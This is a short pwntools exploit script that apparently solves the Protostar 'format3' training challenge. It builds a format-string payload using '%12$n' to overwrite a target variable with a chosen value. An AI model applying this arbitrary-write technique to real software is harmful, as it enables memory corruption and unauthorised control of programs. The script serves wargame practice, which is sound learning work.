#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/format3'
sh.download(binarypath)
elf=ELF('./format3')
p=sh.run(binarypath)
addr=elf.symbols['target']
amt=0x01025544
payload=p32(addr)+"%"+str(amt-4)+"x"+"%12$n"

p.sendline(payload)
p.recvuntil('\n')
print p.recvall()
os.system('rm format3')